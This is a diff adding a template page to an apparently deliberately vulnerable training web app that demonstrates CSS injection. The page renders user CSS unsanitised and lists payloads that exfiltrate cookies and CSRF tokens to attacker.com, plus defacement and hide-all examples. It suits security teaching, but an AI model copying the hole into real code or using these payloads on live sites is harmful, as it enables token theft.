@@ -1,0 +1,58 @@
+{% extends "base.html" %}
+
+{% block title %}CSS Injection - Vulnerable App{% endblock %}
+
+{% block content %}
+<style>
+    /* VULNERABILITY: User-controlled CSS is injected here */
+    {{ custom_css | safe }}
+</style>
+
+<div class="card">
+    <h2>🎨 CSS Injection</h2>
+    <span class="vulnerability-tag">MEDIUM</span>
+    <span class="vulnerability-tag">CWE-79</span>
+    
+    <p>Customize the page styling. User CSS is rendered without sanitization.</p>
+    
+    <form method="POST" style="margin-top: 1rem;">
+        <label for="css">Custom CSS:</label>
+        <textarea id="css" name="css" rows="5" placeholder="body { background: red; }">{{ custom_css }}</textarea>
+        <button type="submit">Apply CSS</button>
+    </form>
+    
+    <div class="hint">
+        <strong>💡 Try these CSS injection payloads:</strong>
+        <ul style="margin-top: 0.5rem; margin-left: 1rem;">
+            <li><code>body { background: url('https://attacker.com/log?cookie=' + document.cookie); }</code></li>
+            <li><code>input[value^="a"] { background: url('https://attacker.com/?char=a'); }</code> - CSS exfiltration</li>
+            <li><code>body::after { content: "Hacked!"; position: fixed; top: 50%; left: 50%; font-size: 100px; }</code></li>
+            <li><code>* { display: none !important; }</code> - DoS by hiding content</li>
+        </ul>
+    </div>
+    
+    <div class="hint">
+        <strong>💡 CSS Data Exfiltration:</strong>
+        <pre>
+/* Steal CSRF tokens character by character */
+input[name="csrf_token"][value^="a"] { background: url('http://attacker.com/log?token_starts_with=a'); }
+input[name="csrf_token"][value^="b"] { background: url('http://attacker.com/log?token_starts_with=b'); }
+/* ... repeat for all characters */
+        </pre>
+    </div>
+</div>
+
+<div class="card">
+    <h3>Sensitive Form (for CSS exfiltration demo)</h3>
+    <form>
+        <label>Username:</label>
+        <input type="text" name="username" value="admin">
+        
+        <label>Password:</label>
+        <input type="password" name="password" value="secret123">
+        
+        <label>Credit Card:</label>
+        <input type="text" name="credit_card" value="4111111111111111">
+    </form>
+</div>
+{% endblock %}
